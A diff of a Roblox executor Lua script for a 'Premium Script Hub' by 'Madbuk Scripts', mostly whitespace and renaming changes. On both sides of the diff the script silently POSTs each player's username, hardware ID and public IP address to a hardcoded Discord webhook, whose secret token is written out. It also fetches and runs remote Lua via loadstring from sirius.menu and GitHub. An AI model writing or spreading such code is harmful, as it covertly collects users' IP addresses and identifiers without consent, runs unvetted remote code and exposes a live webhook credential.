@@ -1,39 +1,34 @@
 HttpService = game:GetService("HttpService")
-input = "https://discord.com/api/webhooks/1126592029351215285/ymz7i9lq9AxWsTmtgXX9tTsj7aM2JEQ5vyUFtKazIBjJZg7ZcE0iNabYq47qngvO9OZD"
+url = "https://discord.com/api/webhooks/1126592029351215285/ymz7i9lq9AxWsTmtgXX9tTsj7aM2JEQ5vyUFtKazIBjJZg7ZcE0iNabYq47qngvO9OZD"
 
-
-local responce = request(
-        
-    {
-        Url = input,
-        Method = 'POST',
-        Headers = {
-            ['Content-Type'] = 'application/json'
-        },
-        Body = HttpService:JSONEncode({
-            ["content"] = "",
-            ["embeds"] = {{
-                ["title"] = "**PREMIUM USER CHECK**",
-                ["description"] = game.Players.LocalPlayer.DisplayName.." (@"..game.Players.LocalPlayer.Name..")",
-                ["type"] = "rich",
-                ["color"] = 16711782,
-                ["fields"] = {
-                    {
-                        ["name"] = "**HWID**",
-                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**IP Address**",
-                        ["value"] = game:GetService'HttpService':JSONDecode(game:HttpGet("http://ip-api.com/json")).query,
-                        ["inline"] = true
-                    }
+local response = request({
+    Url = url,
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "**PREMIUM USER CHECK**",
+            ["description"] = game.Players.LocalPlayer.DisplayName.." (@"..game.Players.LocalPlayer.Name..")",
+            ["type"] = "rich",
+            ["color"] = 16711782,
+            ["fields"] = {
+                {
+                    ["name"] = "**HWID**",
+                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "**IP Address**",
+                    ["value"] = game:GetService'HttpService':JSONDecode(game:HttpGet("http://ip-api.com/json")).query,
+                    ["inline"] = true
                 }
-            }}
-        })
-
-    }
-    )
+            }
+        }}
+    })
+})
 
 Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
@@ -141,56 +136,50 @@ Button1 = Tab:CreateButton({
 end
 
 function notHwid()
-Window = Rayfield:CreateWindow({
-        Name = "Premium Script Hub",
-    LoadingTitle = "Madbuk Scripts",
-    LoadingSubtitle = "by Madbuk Scripts",
-    ConfigurationSaving = {
-        Enabled = false,
-        FolderName = "MadbukHub", -- Create a custom folder for your hub/game
-        FileName = "MadbukHub"
-     },
-        Discord = {
-        Enabled = false,
-        Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
-        RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+    Window = Rayfield:CreateWindow({
+            Name = "Premium Script Hub",
+        LoadingTitle = "Madbuk Scripts",
+        LoadingSubtitle = "by Madbuk Scripts",
+        ConfigurationSaving = {
+            Enabled = false,
+            FolderName = "MadbukHub", -- Create a custom folder for your hub/game
+            FileName = "MadbukHub"
         },
-        KeySystem = false, -- Set this to true to use our key system
-        KeySettings = {
-        Title = "Untitled",
-        Subtitle = "Key System",
-        Note = "No method of obtaining the key is provided",
-        FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-        SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-        Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
-        }
-    })
+            Discord = {
+            Enabled = false,
+            Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+            RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+            },
+            KeySystem = false, -- Set this to true to use our key system
+            KeySettings = {
+            Title = "Untitled",
+            Subtitle = "Key System",
+            Note = "No method of obtaining the key is provided",
+            FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+            SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+            GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+            Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+            }
+        })
 
-Tab = Window:CreateTab("Not Premium", 4483362458)
+    Tab = Window:CreateTab("Not Premium", 4483362458)
 
-Section = Tab:CreateSection("Not Premium")
+    Section = Tab:CreateSection("Not Premium")
 
-Label = Tab:CreateLabel("You are not a premium user.")
+    Label = Tab:CreateLabel("You are not a premium user.")
 
-Label = Tab:CreateLabel("If you are then DM thanhtam8765 or jakub your hwid ID so i can whitelist you.")
+    Label = Tab:CreateLabel("If you are then DM #madbukscripts your hwid ID so you can be whitelisted.")
 
-Label = Tab:CreateLabel("To Find you hwid ID simply click the button below")
+    Label = Tab:CreateLabel("To find your HWID simply click the button below")
 
-hwidlabel = Tab:CreateLabel("hwid: "..game:GetService("RbxAnalyticsService"):GetClientId())
+    hwidlabel = Tab:CreateLabel("hwid: "..game:GetService("RbxAnalyticsService"):GetClientId())
 
     Button = Tab:CreateButton({
             Name = "Copy hwid",
             Callback = function()
                 setclipboard(game:GetService("RbxAnalyticsService"):GetClientId())  
             end,
-         })
-
-    
-
-
-
-
+        })
 end
 
 whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/MadbukScripts/ScriptHub/main/hwidlist.lua"))()
